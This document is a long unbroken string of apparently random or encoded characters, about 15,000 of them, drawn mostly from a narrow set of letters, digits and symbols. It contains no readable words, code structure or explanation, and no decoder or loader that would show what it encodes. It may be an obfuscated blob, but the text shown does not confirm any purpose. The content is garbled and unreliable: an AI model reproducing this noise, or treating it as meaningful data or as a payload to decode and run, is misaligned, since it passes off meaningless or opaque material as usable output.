4rC(Cqj:(644#JS*=q(nS:##S6r-#<x::nC4j44JS(SSvq#j#Co6j-n)JjnSo4qCo4#-((q(4S-=46YVt-mS:(6jSCJ4mJCw(JRqRCmC-4q-jJJo#:(jmC666J4Jj(nSS:Cmq66(:oJSJSmC4mo#mQmoqSC4(6j6qJJr0nm:m=4=jmS-:o((On#4S4J6-m-n:qCnnCnmD-Jm-o-C:jCCn6noeJJobqm:(--6:-4J#qSS1#o=qJom=S-(-C4:-6j-(J(oJS#:(6C6#mjJ(q(S::#4(m4m:qSqq=(6(#m#4oCJ6Sjjq=J-C#n(((JnJnm=4m(-=(#(on4:j4j663JojnmnoC4=:Jj(j(Jjjn,6S4:mJm-(4:Jj==m64m4N#qSn44(=Wm#m6S4j4CjC(-J#qbmo6SC=JCq6#-CJCojn(:C6m#(m#JCqCS-C(4ClJm-q4q==C6C-S-JomooS#j==j-m-oJ4(jnjjS4J#jJ#oJq4njCj=6-J,jqmq6CCC:mjJj((omj#ni=46:mS(#oEnC:S4S6(mmoSn4nmCC4S-Sm=omSSC#C=-j-nqSnS:Jj#644-mCJnq(:4:o#S#(3(J:q#CS:q#m#qx#oqSjjqCJ4qo6c#S4Sq4C#CpqmJoJ((n4:==SJ=--qC(==q6==v-ClS((j4jjCq6qJ(0n(mS4:4CC#Sm4qJ(o:m:6#C#:(jSjj(nm4#=N-4R:(Sj#n=6j6SmSl((mSq:#C=#jJ#Joq4S:CS-b#:(6J6:qno#JmJJ67C(Cq-:(##3(-#E=(==q:S=q6(mjnoqoSm:om=66oCS6:n=j#-4<#4qUo#Sn6oCq-kJjq#nm=nj:==#(-2nq(:n4:n4j-Jmqn-q4jq#w4o6-(SnjC-n8=o64-:S6(qn#:C4C6j/(oCnmj(C#4C-Cm-((SC=JC--4-=qCnC:S:J6m6om#J=qj:m:-=q#j?JJ#j(nm:64624k(o6C:nFCS4now&:qJS#:#C4#jm#y6(-nj:qm:#=ojon:S=S6J4##6m4omC=j66C6jmjk6qJ:C:S=o#ooJ<#(=S=:4=-J moJ=(#j(6(4m#-m#(JC6jC=oA--nI4o6=nj-4j#(U(JJq#j(:o4q##m=n-q_C#C6m4J4(j((SojJ=S59mo(m(#n#:o4jmmm4J:q:CjC(=7#pq=o4q:j:-o6(#^+Oj=S4j:=:Jom({B(t==:4=:#:qoo((An;#=44#=mCo#C:jSC->=#6(:n=:C6:C=66mSJo:nn(:6m:g=omq6(64n::4=-(mYjqSJj=-n4:JqqSn:=qjn=:#J--no(mn:#q-n{;o=J:ConqCn4m#6q>o#Sn6oCq-7Jzq:jlSo:q=#6=(-J4qq=G6o-=ano4J=CqnnC:6J#-So(oqmjo-=66JCqCn6C64n#,J=m6Jj:6nCCom-!8(nSoqo46:-4i-COnj=Sqjj=C#J-6S-(::#:4446ldSq#qonSCj4m#=q6o-j4nQ=C4-m(ELo#q.6:=Cmj--SSjSCp:#4#6mEjonqJ4nC:-S-q(wnnq6:S=J6mJjJ(o.S{=m=o#4mjoj(SjJCj###6o4o=(aj(C#4C2mk4o:S:=jC=wn-mJmo#nC4L=###mooj:JCSCq==##Ejo(jCjSCo6oJJU#o6q4jm-=6oo-JjqjSSCJ-:#S)SJ=qm=C4#4C#ngnn,SJnR:m6(o-84(qCZjo6mmSoqq#:qSn::4J6-qoJmq:=6:66S-JJJJmS4:J6j-#-4J4o#nS4mC=66mSJo:nn:4S4qJ(((qmq4n=:C4#o:H=SjSS:SC=6mJjJ(oQSb=m=46=-CJ#::no:S4j#mm=n6q#C4CC6C#jJ(S4S:j(-:46-m)no4Sqj-mo#o(nJnj-n46===JCI(J!qhCmC44:-:So((q0jB-=64-=aC(#=::S=-J=-6q:jCC=#:==#6bSooCnj(C6Y:#=mnS#:#4J-64--_JC(n==:==j6=qoJ:jJ=J6omqlm(4joSqnm-q6J-=Snn:Co==C=Jq-nJ:qJS-#o==-(mmom(#jCCm-S#=J(omSmjq=C6mmjP=q(Sm:m=J#CmmoSn#n6:o4S#mm4SJq#n=C=-C-Jv=n-q-:j=(#(-JJ#q(q:=m=###-moj:JS6:-4j#qq:o=jjjn#SmSJJa#o6q4jm-=66JCJjqjS6CJ#C#SmooojJnf:n4C-(mmSSSJn-C--#-CT:ojS46n=(66o_,tqCnSCS=(#m1Sy=jJnmCm4J-Cq(J-qcjCCnp=-6(C(:Cj4j#(6m--W#qJ=6:-#4#CaCJ-S(C4Cj4q-q((omq6j6-n6j-nFS(C=q:J==JnoCqmo=CJjxm=66m-ojqq4:C:4S#:qgonjm=h6m)oJ6q:janoj#mo6mm:nqjjCC4==:oomqonqmn6#^6o,mP#(#So:j6m6--qJjqJS#4(=m66m6q4(%n(CS4##:q=o6jCjj=j4SmJHn(mS6:C6m6qm#J=qj=o:=--6-(noq:(=(6-44-4mD(S:m4S=o4:-4JS(J:j:(Ci6XJmJ4(=SC:#m:#=ojoSSSn=Cm-j-(msoxC=j4C:6:(oJ(o{S_6==46=-CJ#::nS:-m=5#((q-(-4::=46-SHojnS(j6-:4=Jn(#n#CS66C-6gmCJn:=nj:sm6}m(:Atjjnn#D4o-q+#o=C-jo=S4FmJJ4o-=::S=-J=-6h:nmCm6nm-6vXoo4q:46Cn4C-4J(o-Cr:J6m6#m#L4qj:m:q=j#C&JJ6:-nV4#4o-48j(Sj#j:CS4:o;JJSmS#4###w:-:SlqoS##o=-1{--JC(m:!Cj4=Qjo6n6Sn4qC:#J-#J4jSSmj6=6m4m=^Tq(n#:C#m#4m:o:jjnmC:m6-SJSo(Sm=nC=#(-mJm(JnC:m-C6qmnJm(6=*Co#m#-(#S#jCjSCq4(-jSo(q:Jjm=m6qmCqJ(#S=:=#C6SmoJoq(nn#:==#omSo4j4jjCn4S-CSq(JS=4-=j#j-SoJn:S6CS4J-Jm(o4SJ=4:n4:-Jm-joSq=JChmmJm(4(jSnjS=CJqmnq(qJjJ:n44^(mmJ6q6C4Cj4q-qq-omq-n#=JI6-6NCo6=q:S#(#J/JTmq4=o:m4m#qTCo:q(4::x6C-SJ(SCq-jCC6m(-m?6(6:4:j=q#q(-Jm(-S#CJm6#Czon-:J=S6q-C#:SooqSnjmC62v-#Jn:oSqnF#jVjomnn(:n=C(=Noqm:o4qnjj=J4qo-;4(qCxjo6-mmo(S-odno:4=:J6mqo#qCjC:j6(-ComoqS#jC=C4-m(JCqJS#:#Cm#jm#qSqqS=:#4j#(oCoSqojo6J4n#CE4((q-4>=J-m-#J#o4njj64S#JmmS=(=j(:m-mTmACn((#n=:=44#-q/ooq=n#=(m(-mD-o#nJ66=q##mCoC(jj(CC#m#qh#oCSCn-=(6CmJ>#(#qm:j=#mSmJF-(-=::C=:6jm4nnq(n6#:-4Jqo-J6Cnn:C=6(#)Sq(qSJjq-6#(J4q=joC-4C##J6m-JC:-n4CqmLJ((CJqj4n=-q4n-:JJo-=oj=4(6mmmc#qCnm4S-P#CYCJ-S(S:4mmoJm(((oq:j4=S6JJjJ(o_SN=m=q6jmCoJ(6=-j_--#n(=o#jjn=#n4m-mm#(C:Lj#=#6omjSJnSno=m=-/#o#qCqSC(:n6J#-?4S((XC#C464#CJSo=n(n/=#m(-:oJo-n46n=n#m-6S4j4jS6m4=Vj7nnS:S=JC#-4#-JC(nn(=4=omSm(o((:n#4S4jmmmqo#qqjjCq4J#qq6o#j4jq#CmCoqJJqJS(:4==6S(=oJnCn#6q-=6T<CoSS(C4Cj4q-q((onSmj4=44CmSJ4nJnS=m=6mCm:SjjjC(:m##6?<4o:SSC#:=-j-SJSo(Sm=j=q4m(q?:(4SojjCF6=(-JnqmS6CCmq#6(zJp::nn#SmSJ^5#(#So:j-JUjmJ1-(-:#:=#j#n(SSSjJn#44=--C,n((j4n:6S6(m(^J(#:S:oC#Jo-nJCoeSSj-=:J6m6SX(8=::nmq#qq(o#q=j=6C6nJ(JojJCJ=#=Cmj-=oSqonm4j4q6mqqJ:q4no:j=H#=q-omq6j6646=#PJ((#SC=m=46:m:qjq(no:J4SJ)m:(Jq#j#:46j-#((n-Sj:jC6#J#n(#nIC#4J=#6=m=nqqSnoCom6##m=o=CqjSCo6oo6p#o6q4jm-=6j-;S6o-:=4C-oJ=-6J-qjnq#:4S#-q=J6j:=j66I:#=}6(SSo6n=(66(:?=n:CS4jmn6:m=o((;4qCJ4=on(jS#(==J:;E=#6I-(jSq6:=:6S-:SP(6:m4m-SJoo-S(:^jo:#7o#m^:jq:S=C6=4:(oKq(nSmj6-v#jBJJ#q#noCj4#I(m:(Jq#j#:46j-#(S(qq=j#=j6(JCJS(ono4J=66C-6nq(nC(6n-;JJq:o=qS4=Cj4_o6m-S=CJ4o-=46--Jj(q=:::=S6:(hJ6nm=J6nmop6(:nrSon#-o4m-:Sqon:q4S-64--!JC(n==:o44#jWjJSSJjj4#6J-4vj(jq6:J=j-m-6(C(:Cj4j#(6mJ#V!q4n:CS###6mooSqmn46J4##=^=SCq6:S=J#J#mJ4qJ:jj64S#JNJJnq4jJCC4S-SmjomSSC#C64o-S8mo4:Jj#C=6=JCJS(qS(:jmo6=K(JmqmS#CC4mhSm=((qmjmCq6C-mJj((n(jS=##(J4Jj(qnq6-=m66m6nnq=SrC(4##Como4q:j:6j6(-olJ(SC,jMC#4!(:E=njC=6q-SJ6m-JC:-n4Cqm)#oo-nS:n4-:)6o-4c:j6S6jCC6Jq-kq(jSC=6n#xL6qqonqJ4nC(46o:m=S::C4.Co6q-#k=j-Sn:m=4#4-CoSq4CJCS4m#4*4J SSj46(4Hd#b6n4:4=j=(mJ-qJm(6nC4J=76nmCo((mCSCJ=-#-o#JLSCjS=S4(-mJSS4q :C=S#S-=JmqSn#:C4C64g(oCjJn :n4C-(mmSSSJn-C--#-C/:ojS46nC-#jm(o((Jn#C(#C6-_jo(S(n:C#6(-4Yj(jqC:J=j-m-4v:(:=o:(Cd6p(=J4(:n:#o4(#omJoS:Zn#Cn%o#q-RSj:S==-n4:-=J(op=q:q=J6q(6J-n4C64/--A=(qn6q-nC#-44-qqznJ:(nq644=(qQn(:nJj-mo#o-mJo:=n44C4j-jmS(J::jS=S4=-m,-oCC-jn=m64mC(m(qSm:o#C#SmooojJn_:n4C-(mmSSSJn-C--##PJC(SnSj(=m#SJ41bqCnSCS==#m)SS#(>jCCS6S#jQm(Sj#j6Co6S-m*4nJS#j===mCmSJq((nj#o==-(mmom(#jCCm-S#=J(omSmjq=C6mojW=q(Sm:m=J#Cmmqjq(SR:*m=#4m:o:Coj(Co4J-Sq+o#Sn6o#(mCJnenj+So:q=#6=(-J4qq=y:oC-tS(qSSCqnnC:6J#-So(oqmjo-=6JJCq:n6C64:#mJ=m6Jj:6nCCom-Gm(nJojCn:-o4q-nkmo6CNj:-q6#m#_4qjC-:4446<BSSmj(nv4#46J4(4SjS(=JCq6m-6JCnJSq:#=C#C-jo(qC:mC(4##CYCJ-S(jC6J4-741=nC:C=S=J-m-oJ#(=nj=m=oB-mjoj(SjJ6:4S-Sm=om:CC#C=-j-nqSnS:Jj#644-mCJnq(:4j-4j#(_(JJq#j(4C4#-jU(((q:j#=(-4-:(S(qC(4(6m64JC26qjnqCJ#C66(:oJSJSmC4mo#m3moqSC4(6j6qJJxhnm:m=4=jmS-:o((*n#4S=:-Jm#o#(4jjC#-(-jJJo#S#jo=j6#JSJoSmS-4###mCmSq((njJ:-44E(mnnoq4j4:C6SJ6xC(Cq-:(##mJ-1;n(Cn(jm#S#J--J-n#no:S4j#mm=n6(-C#:*6C-SJSo(Sm:S646#mCJSqSS=:m4Sm#m=qjqn=S6S-J##o4J-SCjn=(-4#-Jj((n(jJ=##(JCJ4qjn(C(=:##r(q4q:CSCqm(J(omo4jCn6=j6qmJ(Co6nS:J4J4mm4oJnjnCCS4J-Jmno4SJCCCn-(-oqJnJj#jC6j4=mSJo(m:jj=4(6mmm{#qCnm4S==-(mmomqqjCCm-j-q(Joz:m=m646jJSF:q(S.:##S6:)JJ#q#S4Cj4#z(m:(Jq#j#Co6j-#(S(ojmj-##m#JCJSn(SnCJ=-#4o(Jnqmn4C4=C-S_4SJqnjmC464#VJS(4:(jZ6#66o4q4njn(4J=q#mm6oCjJS-444C-Cmj((q::J:-64JJ2n(mq6:C-q66oX38j:Sn6S-SNkm#o#qojj#Jmj-qm=o#Sjj(6C6S-oJonJS#j6C46m(=Jq(jnCCJ=6J--+qmqoj4Cj6j#SJJ(jj#jm=46jmj)6qJnj=m=6mCm:SjjjC(:m##6A{4o:SSC#:!6C-SJSo(Sm:S646#mCJSqSS=:m4Sm#m=qjqn=S6S-J##o4J-SCjn=(-4#-Jj((n(jJ=##(JCJ4qjn(C(=:##}(q4q:CSCqm(J(omo4jCn6=j6qmJ(Co6nS:J4J4mm4oJnjS6CS4J-Jmno4SJCCCn-(-oqJnJj#jC6j4=mSJo(m:jj=4(6mmmM#qCnm4S==-(mmomqqjCCm-j-q(Joe:m=m646jJS>:q(SQ:##S6:/JJ#q#S4Cj4#E(m:(Jq#j#Co6j-#(S(ojmj-##m#JCJSn(SnCJ=-#4o(}>n#n4C4=C-Sm=(((?j#6(4:mJm-(4Cnj--o6oo=&:jjCj6o=m#mmqoC:(=CC(=H#gq=o4q=nCC#&:-SG-j=q6=:#jm-(:2=(6nS:omn#nm(Jn:-n=4#-mc!(OS4:J4-Ck44oB/#(n=o4(#:4nJ#56:nS::=4(6)qqJ6SSjJ=J=m-4JJ(Cq6:S=J#J-nJ4qJnj=#=o#4mjoj(CjJCj#m#-mqojSJn#6(4m#6 6S4qvj(=S6#-:S=o6:4j-4j#(s(JJq#j(4C=--jr(((q:j#=(64-jJjoCnJ:j6m66JCJ:jjCj4(=mm#-to4q:jS4#=iJ6LS(Sq(jm#n6(m(t:(#Cj=4=:mSmqS(j(:m:4#C66zjoqSJCC:n-(-JJJJmS4n,=C4nm(q-o-njjq-(v(m#Sjqo:m:--#0#oCoSj(nn=J4--4((onSmj4=44CmSJ4nJnS:m=4#4-DoSq4C(:Y###6(4S4jjj(6J4q-m16(C:Jjq=#6CmCEjq(nC=m4(##mCoC(-j(CC-J#-o4o=:C=C6S6JImWo(#S=:j6m6oo-JjqjSSCJ-:#S^SJ=qm=C4#4=_jdnnS:S=JC#-4#-JC(nn(=4C:mSm(o((Jn#:o446:)Sq4(TjC:n6(J-m-(jqq4(#(6#ojJqo=S#:j=(mCmSJoqoCJ:#=664mmn=qqnjCC6J#6q-J/jmjo=46jmj*SqJnj=#=o#4mjoj(6jJCj4m#4A4J#SSj46(4!Y#*6n4:4=j=(mJ-qJm(6nC4J=qbPmCoC(jj(6=4j-jm6(J:4CmC6-C-:qjnj:(jm6#4pm4J:qS:#j=#j#S*SJ(qmnqC#==-jqoooS4n:#jmjmJq4(n:(:o-J5JJ#JCnjS=CS4o#mojJ=S(nmCm=#-C7mSSSC:(Cm6m-qJC(m:j:q#J6Qomqmn4nj4S=:-(mRo#jSn:=J4#-#m4(jS#=(=j#J-#J#(onj:##S#oJmJ-j#C#4C4Se(mn(Jq-j46(4noo_4(4qC:S#66CmC?-q(C#4J=-m4m=SCjCCSCJ#m#oL#o=SjCm:6-C-jJjoSnJjn=m46mC(m(qn#j=4jJomoo4(:=j6j6JJ4gSooSo46C#4=-=Sq(SSo:o-66#-6Q4(m==:j=<J6--q=j=C6#==6#-_joqC:jSC-p=J4qnS-:Sjq--41moJ4(:=6:C4oJ--?d6j(=o6(Uo#q%nomq64iC#6no=W=q(Sm:mC##Cmmfqn4nCCC=4-((#J:q=j(:9Nq-n(((oCJ4J6#6C-:Pj(4=n::#S#(/(J:q#CSCJ=-#-o#oCq:njC4an#dK((SS#j:-=64JCJjqjSSCJ=n#mm4oCnmnqC#4C-jqoooS4jj#jmjmJq4(SSo:o-66#-6+4(m==:j=BJ6o-qToKCj:nm)#o%qo#q=4-Co6S#_JJ(4q-6:=S6-(=W6o::m4#-jJ--<ooq4n:#64C-oqnonSmj4=44CmSJ4nJ:j:S4S6jmmSC(qnn:m=6J13oqmq-=#6#-C-Sfqo(Sj6o=qmJ-mJm(qnC4J=#6=m=qCq:S-CJ44#jo#oCqnjn6S4=##3m(jSo6q=nm(mJoJomn4j;4C#n_(qC(-jjCq6JJ6Hqn:q:=5C-m#J#q:(SnSj==m{Com1C(nSn:j==J6--Jn(Cnm4m44#=mCo#C:jSC-Eo-oJ4(jnjjS4J#jJ#q(qJjJ:(44JS-_ooq4n:#64-_4H=nC:C=S=J4}#mJ(j-SM=#=4#4-1oSn#nC:n4nTS^JJ-q-4:CC4n-nq;(JqNnm=({--4JqjsSo=W#-TJ(- Tqon4::m6#CMon-jY=j:o-C#:SooqSnjmC6dx-qJj(on(:#ClJ=mjJ0:6S-j=-J*L(qn^qojqC#4=o-e:o4S#:SCeJomqqJ(mnmj#4C6-kjoqSJ=6Cqm:#:(wo-:#=##:6SmS,=(mCC4m=66omSJm(4CJ:#==#=oCoJq==-Cj6j#SJJS:q6:S=J#J-(J4qJC4jn=:#J--noqqCJ:.-m!mo4ojqnnSCCWq-n(((JnJjn=4m(-mf6(6:4jj=q6qmSJ::=S6:q=j##o#oCq:njC4wn#5.((SS#j:-=66JCJjqjSSCJ=n#mm6oC:qn66*=VJ:wnnS:S=^C#6#-oJjjJCj:JC-6-(:JC(:Sj:4mn#(m6n:(=Sn4#-6Joq6J-qfjCCnA=-=,jo==oj-#JmaooSqjJCC#o4q6mqqoJq=4n::=qr4(=S#C=n6C-6j-qS:(oSS:j=m6=(6Jon4nCCC=j-(o4J;q(jSC#4:o=DqSCqJnS6#6:-SO:j?nJ=m-Jw6(4J6:=n6:jm6#nmCo4S(n-#x6JEmM=(#SC:j6m6=-j7=:onq4J-qI-(#oJ:6n-:Cm-#:m4o#SSnM-o6(JJNm(mS6:C#J6n-CJ4q(S-6z=(mmm#o#j#jj4m4q#j.C(Jq64-C*-#-4J4n=nS=#=S6-(=z#nC:m:qm:##mnon:Pjo4--S#:q-J)Soj4C:_6-nJ#(=nj=#C##4m:oSn#nCCC-C-(oCJ.jjj(:P40im_4o:S:=j=(4Q-!(m(-Sq:j4J6#o(Jm(6n6444#-jG(((q:j#=(-C#-Jj((n(jJ=##(J4J:nSnq6(-(mmm4qC(6jjCq6JDCm6(SSJ:J:m64mJ(j(4nS:J4J6nm4oJnCnn4(4oJJ(Jq#qCCj:=6S-olmSjSC:(Cm6m-qJC(m:Sj=4(6mmmE#qCnm4j4q_JmkSmjmC4Cj-S#:J(oGS#=SC:#J-#J#o4nj:##(44#mqjqqCJ:R-m;mo4ojjSn:=(4r-#(So:nJj#=#44mjJ#n(njCJ=###moojq#CSCo#m#-(#S#jCjS6(4nmJF-(4:(jn=m64m4FCqSn4C(=m#mmqoCqmCS:=6(#mpmoJSCjm6j6qJJ/Wnm:m=4=jmS-:o((;n#4S4j-Jm#o#qojjC#-(#:JJo#S#n4=j6#JSJqo=S#:j=(mCmSJoqoCJ:#=664mmn=qqnjCC6J#6q-oqj#j4=44CmS(#(oSS:j=m6=(6Lmn4S(jj#m#=mjJ=Coj(6Jm(J-q#o-C6j-CC3--:L4(#nSjkmo#(oJJ6qmn4CC-J#6mCJ6Cqjn6(mnJtqm((C-jzC4y{-=.#(mnj:omq#no(oJSJn-C4-(#:m4o#SSn9-o46JJwG(m:m:C#J6n-CJ4q(S-6i4Jmmm-o#j6jj4m4j#Rq6onj4=JCnD=-mz:(:=o:(6}mj-=SN(onq:#==J-mJomq4jC4m4n-#HC(jjmj6=4m4mS(4o4:C:S=o#ooJJ#(=n=4C4S#o/oSJq#n=C=9q-S)o(oC6j#C=6=(qJS(ono66=#6=m=nqqSnq:(4joommo:Cq=C64-:#:SooqSnjmC67;-#Jn:oSq4o#jTq(?Joqqn#:=m-#4Uqn}:qC-6S4qo-my(oS4j:-66CmoS-o>:-4(-nJ6--JhqCnn#=6J-4Oj(jq6:J=j-#-oJ4(jnjjS4J#jJmJ4(=SC:#m:#Sm-n=(6C:4mmSJSq-J9Soj4C:96#1J(o-Sm:CC6Jnm(J6::S=jn##AmqnJ:q=j(:%)q#-PJ((S4jn-:4=JCWnn(nJCJCm#4-foC(nj(6-=--jmqn(:(j##j6o3mP-n#:#=C=Sm(-noJ(-n44(=n#mm4o4(CjSC4-J-S+mo4S4ne=S64J(T_S#S644#4mjm(qJ(qnm:64C+Jmqo#qCjC:j6(-Com((S#jC=C4-m(JCnJS-=4==NCoCqSqJ:m:o4##=;jqmqo=-Cj6j#SJJn:SS:SC=6moC(#(=:j:n-SgSoJJ#n4S-CC4n-(o4J:jSj(=(4J-#so(4q::S644wmC)nq(C-j-4j6q((S(q#=jCo#m#-(#S#jCjS6(4nmJr-(4:(jn=m64m4RCqSn44J4S#mm4o4(ijSC4-(#Yo#o6:4=46j6(JJhq(mS6:C#J6qm#JCqCSjC(4CmmN(o#qCjC:-6(-C(JoHqnjC=(4mJSJJo-S-=#=o6SmjJm(==6:-#4#CVCJjS(n:=J4--4qno-Cojo#=6:ojqjjoSm:m=q#C((SC((S0j!4J#qqnJ:(yn(CC-C-S*qo(Sj6oC64mmJJC(q=n::#S#(7(JJq#noC44:-S(7o::6n6#q6ooJqJn6SC:CC-#(o#S((#S=:=mq#Smooo:6n#:6=4#mq=ojqz46:--6JCSqonS::JC-Jo-mJ::qCj4(#C6:qoJqqnnm:6mF#=m#omSjjo-q6nJ(JJqJqm:4#(6N-4S8(qnjj-=(66mnn=qoj4C:6SJ_3:n6q64q=oQJoJq6(CnCj-4(&#((J#(=n=4C4S#qm(ojCon6:m6J-C%qjnSo4nCqm(-=(#(4n4jP4Sm#-=qj(6jS:64m#6mCJ6CqjS6(46oJqJn6SC:CC4#(moi#:oSq4JCzd6(oJ:SJn#C4-(#mm6o6j4n-=j6(m(AJ(#n(=CC:mjmqqJ(9Cm4m#4#joSJ:S(nTC#-S-jJJo#S#jo=j6#J(<:qJS#:#C4#jm#qSqo:m:--#;#oCoSj(nn=J4--4((onCoj4=44CmSq6(CnCj-4(p#oJJ-n4n=6C-C;SgJqmqoj#C=6j_mion-Sj:jCS#Jo:JSqSS=:m-Cm#m=qjqn=S6S-J##o4J-SCjn=(-4-#Jj((n(j:=##(JCF-qjn(C(=J##v(q4q:CSCqm(J(omo4jCn6=j6qmJ(C(4nS:J4J6nm4oJnjS6CS4J-J-mo4SJCCCn-(-oqJnJj#jC6j4=mSJo(m:jj=-n6mmmf#qCCM:#4##oBjnJjSjJ:-4-o:vCo:qjj4-n6(-6S:nC:j=#C6Jn-:J=q(SP#q=-#J1(o4qn4::=m:#,qq(j:Jjq=#6CmCGjq(nC=m=q##mCoC(-j(CC6J##+#JmSjj#6S6oNmv-n#:#=C=Sm(-noJ(-n44(=nJom4o4(CjS664C-Cm-((:#=JC--4-=qCnC:S:J6m6om#J=qj:m:o44#jvjJSSJjj4#m##:JJo#S#jo=j6#JSJoSmS-4###mCmSq((njJ:-44K(-lq#q4j4:C6S#=J(JgS#=(C:#J#-J4jnS-6o=o%=-:Sjjj=o:m4m#q?Cn(:Cjq6J4DJm(mS4Sj=SC:#(-bJ#nSS:CJ=###-4ojq#C(::6J##<#ooSjj#6S6o3mv-n#:#=C=Sm(-noJ(-n44(=n#mm4o4(CjSC4-J#ndmo4S4n3=S64m(}n(mS4:4C##Sm4oJnCnn4(4oJJ(Jq#qCCj:=6S-odmSjq-=JCm6m-qJCnJn(=4Ck#C-}o((_S#j9m:#CojJ7:S=S6?4#-#mm(jSnjJ-n6#JSJCnOCnj64S#Jmmqjq(SY:U#m#o!4ojSjnS=J6jV#JJS4SjjnCS6C(qw-(Jn(:4=nJ:-6qj(SjSCJ6J#nE4(JjCn-CJ6(-40nj:S:=CC-6Jm(J4(n=:j=#j4m-(q4qnCS:--y6mm=q6nn:CC46o#qq6Jmq(4=CJ#(mCJS(nnn:4C-mmm6J((cjJ:n4j#jm-n=Sq4oCmBJ-q)j(CnJj6--6mJ#Q6q4njCS##66mmJn(4nq:-8o-(J(n(S#:S=J#JJKJ4qJ:C:S=o#ooWo(qCS;:m=(#jm:o:q#SM6J4-#STo((q:jCCC4wo6K6jqnJ4p=-EmmoJSqjnm:=m6##o4J=SCjS=(6JmJqJ(4n(jm=mm-mCJmnSnq4(=m66m6q4om=C4#4:#Sm:nkq(Cm#Jm6-CJCo4n(:oC#JomqqJ(xCm4m#46Qm(oSq#n:#=44aCm6(jSq:J6C6J-=Sn(jnjnm4JmjJ#qmjnCq#o=q#nmmJ6:Ano=J=mJ4(#(jj#nSC:mM-#J#(onjn##S#J-MNmq(=-j>4m6#(CS4SSC4:(6(J-F4(4qd:S:4m(-mA6(6:4:q4jJSmnSCjCj(4C=:2j_(J^q2CmCo64-jJjoSnJ:j6#6#o-5=jnno6o4SJJoSoJ(-n-#:4C#nInn,SJn-C-<:-C_:ojS46n=(66(:0=nn:#4m-SJ6--JFqCnn#=4j#pq6nJ:n=o:Yp=#6X-(jSq6:=S6-(=qmjSq-4S=qJ--Tooq4n:#646#Cm6jqq}=(#qmjonqJnS=q:n=JJnm(J6::S=4:-Cb6qnJ:q=j(:FDq#-.J((S4jn-:44JjJSqSS(:m#j66-moJqCnq#n=:gSm=((qJ=m6-6CJJ5noCS4:(C-Pz-n(m(qn#j44jMm-6q4(-jj:S6J9jm=SSq#jn#=4qcTqqjJq6j-=j6q(:JS(-=ojZ#=mmmqo#(4=C6C6(J#m:o=S(n;-q6nJ(JJqJSn:4#(6nmm>#j4CCCS#46-oCoSqojo#64##6m4omSJj=#-46Jq(4o%nCjj-S+SmmSC(qnn:m=6J<voqmq#j#Co6jkm<o(4qC4j#S#JJjW=nSnJj-=-J:m6JoqSnm:4-J##m=o=jCn-CJ6(-45nj:q==CCnm(mJoJomn4j34C6nk(S-(-jj:qm(J(U#njSoCmC-m#J#(C(S:(jn4J6-m4q((nnm:4446CcSo4jJjSCm44-4mx(SS4=(C+-#-6q4n4:j:(#J6qmmJ6qCCJ:q4##CwCJjS(jC4m4q-#tC(Cq-:(=C#J-#J#omnj:##S#oJmJ-j#C#4C4SO(mn(Jq-j46(4noo34(4qC:S#66CmCh-q(C#4J=-m4m=SCjCCSCJ#m#o2#o=SjCm:6-C-jJjoSnJjn=m46mCSq(qn#j=-ClCV(S#q:CSCqm(J(omo4jCn6=j6qmJ(Co6nS:J4J4mm4oJnj=o:444608ST=jJ=q#J-S-oomo-:#=#6C6SJ(MnqJS-:4#(6I-4S_(qnjj-=(66mnn=q4n:C:-j-nm6omSCjS646j-qJqn(Smj-C##J(6Jn(Cn4C(=-J^m(qmq#j#:46j_mHqojSC:JC6Q-#x(#(on4jC-jDnfJqC(-nJC(44#nq:J-jjn6=S4(-mqjoq:(jn=m4#mC(m(o:#:S=-Jo-6q:j6=C:q4n#mm6nXq#jn#=4:Jo(jo6nSj(-JQJm4SSo_no:4=:J6m-q4qCjC:-6(74m-(jqS4(#J6#J(ZnnJS#j===JqmSJq((nj:C4oJnmqq6j(n:=J=mJ#(#(jCJn6C-6j-qS:(=:j:S4S6=mmqj(=j(:J-mR#iCqmqoC#CC4n-nqK(Jq-j--:6C-:{j(4=n:(=6J:-=qnjJ=1:o4q##m=n-q-n4:-Kn##(Snq:#4:#(m:(nJ:((=::S=-J=omSSo-CS:qm-6t;oo4q:46Cn4C-4J(o-C>jo#J6qm#JCqCSjC(4Cmm;(o#qCjC:-6(-C(Jo-j4j=#CmCJSJJSmSo:#==#jJmJoq4njCj=S-Jpjq#SJj4Cj6j#6JJ(jjmj66C6:ojqjn(Sm=#C.#4m:oSn#S=4j4S-Sm(omqqj#:=6jG#_o(4q::S#}4GmCwnjSCS:m-C#qoJJ>jmCm444jdSm:((q^j#6S4:mJp#(#q4:j=#{:o#qJ(-:4:=-CzCoSoJnmnoC#4=-jomo6qj46:g6(#=mmo:So6n=j6qmqq(qoS::44S#Jojo((vn>4m4q#j.C(Jq64-Cm-#-4J4oCnSj6Cm#JmCJq:nSC6n4q Jm#noqoj4Cj6SJym)(CSS4S#S6moCqmo6:j:n-S#JomSJ::no:S4j#mm=n6q-C46--C-qUJoqC6j#646Co:w:janoj#mo#qoJJtjmCm44=--jv((Jjjnj=S6o-m(j((q!jU6m6--qJjqJS#4(=m66m6q4qjnn:S4Coqm-oJS(j4CnR:-C(j(SnSj(=m6n-CJ4q(S-6y=(Erm-q4qj=6:66S-Jzmn=q=:(CmmmJmJCj(CCjn#J6?omJ4jCC4#o=66m_JoCqq4nC:-SJ:((o-q4n--n6jJSJ(joSo6==66j(6J-n4n=6C-C}Sm:(Jq#j46J4J-mc6(C:Jj#C=6=JCJS(ono66=#6=m=nqqSnq:(4joommo:Cq=o6q4oo6m-oTSCjn-=6j-!S6nC:6j=mq6nm:oJ(-4o:=6(#m*mJ#SCjm6S=##J(C(SSqj(=jJo-=o((mnmj#4C#mvjo(S(n:C#6(5Cm-(jS(:(CS6#m((4(jSq:q--6m--d#qJ=6:C4oJ-omq-(64n::4=-(m%jqSqjJCq^6-:(4n4:-4-#:m-(6J-(C=-:44qJ*mok-jSCd#-=k-oA4o:C6jq=#6CmCZjq(nCCJ=###moojq#C(::6J##Z#JmSjj#6S6q#=l#(jS(=C=S6omoqJ(nSC:44(6-(;Joj_n:664:wCm6(SSJ:J:m64mJ(j(4nS:J4J6nm4oJnCnn4(4oJJ(Jq#qCCj:=6S-oNmSjq=:(Cm6m##JC(m:Sj=4(6mmmJqqCnmCj4(-(mSo#S(C4C:-S-qq(n(jmj46C46mjJqqJ:Cj64S#J/Jgmq4jJ4jCm6(o4o:jSjq#(m(KmI4SCq6:j=q#JJC/6j:nJCJCm#4(oJmqmnqCCm(DjYqSJq9=m6m-4-j(So:n(jz=#mS-:Sq(#n#j44j5-m4o4(KjS6m-(#Ho#o6:4=46j6(JJQq(mS6:C#J6qoUJCqCSjC(-=#jLjJ6SJ=44m46UCk:nj: